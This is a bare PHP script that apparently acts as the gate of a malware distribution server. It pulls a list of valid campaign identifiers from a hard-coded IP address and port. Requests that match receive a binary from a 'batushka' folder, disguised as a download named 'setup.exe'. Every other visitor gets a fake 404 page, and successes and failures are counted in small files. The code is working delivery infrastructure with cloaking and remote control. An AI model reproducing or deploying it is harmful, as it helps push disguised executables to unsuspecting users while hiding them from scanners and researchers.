<?php

$params = getParams();

if (!isset($_GET["pub"])) {
  $count = intval(file_get_contents("-"));
  file_put_contents("-", ++$count);
  header("HTTP/1.0 404 Not Found");
  die();
}

$pub = str_replace(".exe", "", $_GET["pub"]);

if (in_array($pub, $params["params"])) {
  sendFile("./batushka/main");
  $count = intval(file_get_contents("+"));
  file_put_contents("+", ++$count);
} else if (in_array($pub, $params["substreams"])) {
  sendFile("./batushka/" . $pub);
  $count = intval(file_get_contents("+"));
  file_put_contents("+", ++$count);
} else {
  $count = intval(file_get_contents("-"));
  file_put_contents("-", ++$count);
  header("HTTP/1.0 404 Not Found");
  die();
}

function sendFile($filename) {
  header("Pragma: public"); 
  header("Expires: 0");
  header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
  header("Cache-Control: private", false);
  header("Content-Type: application/octet-stream");
  header("Content-Disposition: attachment; filename=\"setup.exe\";" );
  header("Content-Transfer-Encoding: binary");
  header("Content-Length: " . filesize($filename));

  readfile($filename);
}

function getParams() {
  $curl = curl_init();
  curl_setopt_array($curl, array(
    CURLOPT_URL => "http://45.12.253.56:9753/showParams.php",
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_HTTPHEADER => array(
      'User-Agent: 1',
    ),
  ));

  $response = curl_exec($curl);
  curl_close($curl);
  return json_decode($response, true);
}

?>